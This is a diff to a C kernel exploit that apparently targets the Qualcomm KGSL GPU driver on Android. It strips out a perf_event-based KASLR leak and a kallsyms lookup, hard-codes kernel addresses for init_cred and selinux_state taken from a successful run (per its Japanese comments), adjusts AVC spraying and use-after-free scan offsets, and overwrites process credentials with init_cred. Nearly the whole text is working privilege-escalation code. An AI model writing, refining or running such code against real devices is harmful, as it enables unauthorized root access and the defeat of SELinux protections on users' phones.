@@ -95,83 +95,7 @@ void *race_thread(void *arg) {
     return NULL;
 }
 
-static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
-    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
-}
-
-uint64_t get_kaslr_offset(void) {
-    struct perf_event_attr pe = {0};
-    pe.type = PERF_TYPE_HARDWARE;
-    pe.size = sizeof(pe);
-    pe.config = PERF_COUNT_HW_CPU_CYCLES;
-    pe.sample_type = PERF_SAMPLE_IP;
-    pe.sample_period = 100;
-    pe.disabled = 1;
-    pe.exclude_kernel = 0;
-    pe.exclude_hv = 1;
-    pe.exclude_user = 1;
-
-    int fd = perf_open(&pe, 0, -1, -1, 0);
-    if (fd < 0) return 0;
-
-    int npages = 256;
-    size_t mmap_size = (1 + npages) * 4096;
-    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
-    if (buf == MAP_FAILED) { close(fd); return 0; }
-
-    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
-    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
-    usleep(500000);
-    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
-
-    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
-    uint64_t head = pmp->data_head;
-    uint64_t tail = pmp->data_tail;
-    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
-    uint64_t data_size = pmp->data_size;
-
-    uint64_t first_ip = 0;
-    while (tail < head) {
-        uint64_t idx = tail & (data_size - 1);
-        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
-        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
-            first_ip = *(uint64_t *)(hdr + 1);
-            break;
-        }
-        tail += hdr->size;
-    }
-    munmap(buf, mmap_size);
-    close(fd);
-    if (!first_ip) return 0;
-    int64_t kaslr = (int64_t)(first_ip - VMLINUX_TEXT);
-    kaslr &= ~0x1FFFFFLL;
-    return (uint64_t)kaslr;
-}
-
-uint64_t get_symbol_from_file(const char *sym) {
-    const char *path = "/data/local/tmp/kallsyms.txt";
-    FILE *fp = fopen(path, "r");
-    if (!fp) {
-        printf("[-] Cannot open %s\n", path);
-        return 0;
-    }
-    char line[512];
-    uint64_t addr = 0;
-    while (fgets(line, sizeof(line), fp)) {
-        char sym_name[128];
-        char type;
-        unsigned long long a;
-        if (sscanf(line, "%llx %c %127s", &a, &type, sym_name) == 3) {
-            if (strcmp(sym_name, sym) == 0) {
-                addr = (uint64_t)a;
-                break;
-            }
-        }
-    }
-    fclose(fp);
-    return addr;
-}
-
+/* キャッシュフラッシュ関数 (dc civac) */
 static volatile int dc_civac_works = -1;
 static void sigill_handler(int sig) { dc_civac_works = 0; }
 static void try_dc_civac(void *addr) {
@@ -191,8 +115,9 @@ void flush_cpu_cache(void *start, size_t len) {
     for (; p < end; p += 64) try_dc_civac(p);
 }
 
+/* AVC エントリ生成（成功時の挙動に合わせ 500回） */
 void gen_avc_entries_enhanced(void) {
-    for (int i = 0; i < 2000; i++) {
+    for (int i = 0; i < 500; i++) {
         char path[64];
         snprintf(path, sizeof(path), "/proc/%d/status", (i % 3000) + 1);
         int fd = open(path, O_RDONLY);
@@ -238,23 +163,15 @@ int main(int argc, char **argv) {
     (void)argc;
     (void)argv;
     setbuf(stdout, NULL);
-    printf("[+] Integrated AVC+Cred exploit (kallsyms.txt based)\n");
+    printf("[+] Integrated AVC+Cred exploit (fixed addresses)\n");
 
-    uint64_t selinux_state_addr = get_symbol_from_file("selinux_state");
-    uint64_t init_cred_addr = get_symbol_from_file("init_cred");
-    if (!selinux_state_addr || !init_cred_addr) {
-        printf("[-] kallsyms.txt missing symbols, falling back to KASLR detection\n");
-        uint64_t kaslr = get_kaslr_offset();
-        if (!kaslr) return 1;
-        int64_t ks = (int64_t)kaslr;
-        if (!selinux_state_addr)
-            selinux_state_addr = (uint64_t)((int64_t)VMLINUX_SELINUX_STATE + ks);
-        if (!init_cred_addr)
-            init_cred_addr = (uint64_t)((int64_t)VMLINUX_INIT_CRED + ks);
-    }
-    printf("[*] selinux_state: 0x%lx\n", (unsigned long)selinux_state_addr);
+    /* 成功時の固定アドレス */
+    uint64_t init_cred_addr = FIXED_INIT_CRED;
+    uint64_t selinux_state_addr = FIXED_SELINUX_STATE;
     printf("[*] init_cred: 0x%lx\n", (unsigned long)init_cred_addr);
+    printf("[*] selinux_state: 0x%lx\n", (unsigned long)selinux_state_addr);
 
+    /* パイプ準備 */
     int start_pipe[2], done_pipe[2], setenforce_pipe[2];
     pipe(start_pipe); pipe(done_pipe); pipe(setenforce_pipe);
     fcntl(start_pipe[0], F_SETFD, FD_CLOEXEC);
@@ -377,7 +294,9 @@ int main(int argc, char **argv) {
     void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_id);
     uint64_t dst_ga = 0, dst_flags = 0;
     gpuobj_info(kgsl_fd, dst_id, &dst_ga, &dst_flags);
-    uint64_t scan_start = UAF_ADDR + 0x1000;
+
+    /* スキャン開始アドレスは成功時と同一（0x300000） */
+    uint64_t scan_start = UAF_ADDR + 0x300000;
     uint64_t scan_end = UAF_ADDR + UAF_SIZE - 0x1000;
 
     uint64_t avc_vas[256];
@@ -465,7 +384,7 @@ int main(int argc, char **argv) {
     flush_cpu_cache((void*)UAF_ADDR, UAF_SIZE);
 
     printf("[*] Phase 8: Overwrite cred with init_cred\n");
-    if (n_cred > 0 && init_cred_addr) {
+    if (n_cred > 0) {
         for (int p = 0; p < n_cred && p < 32; p++) {
             uint64_t cbase = cred_pages[p] + cred_offs[p];
             uint32_t *cmd = (uint32_t *)ib_m;
